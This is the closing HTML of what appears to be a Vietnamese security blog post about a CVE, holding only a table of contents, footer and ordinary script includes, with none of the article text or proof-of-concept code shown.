  <aside class="toc" id="toc-auto" aria-label="Nội dung"><h2 class="toc-title">Nội dung&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Nội dung</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Tổng khách truy cập'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Tổng lượt truy cập'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Lên trên"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Nội dung"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Trang web này hoạt động tốt nhất khi JavaScript được kích hoạt.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/vi/js/config/829bed1fc699f5783ad9f78328b80ccc.js" defer></script><script src="/js/lib/mermaid.js" type="module"></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
